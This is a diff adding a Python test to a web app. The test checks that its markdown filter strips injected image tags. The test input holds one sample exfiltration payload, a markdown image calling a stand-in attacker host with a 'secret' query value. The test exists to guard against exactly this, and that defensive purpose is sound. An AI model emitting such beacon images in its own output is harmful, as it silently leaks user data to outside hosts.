@@ -8,6 +8,17 @@ from distill.web.routes.channels import _collect_videos
 from distill.web.server import create_app, run_server
 
 
+def test_markdown_filter_strips_img_beacons(config):
+    # Exfiltration guard: an injected markdown image must not survive into the
+    # rendered HTML (it would auto-load as a zero-click beacon on page view).
+    app = create_app(config)
+    md = app.state.templates.env.filters["markdown"]
+    out = md("Lead text ![x](https://attacker.test/leak?d=secret) trailing text")
+    assert "<img" not in out
+    assert "attacker.test" not in out
+    assert "Lead text" in out and "trailing text" in out
+
+
 def test_create_app_registers_routes_and_filters(config):
     app = create_app(config)
 
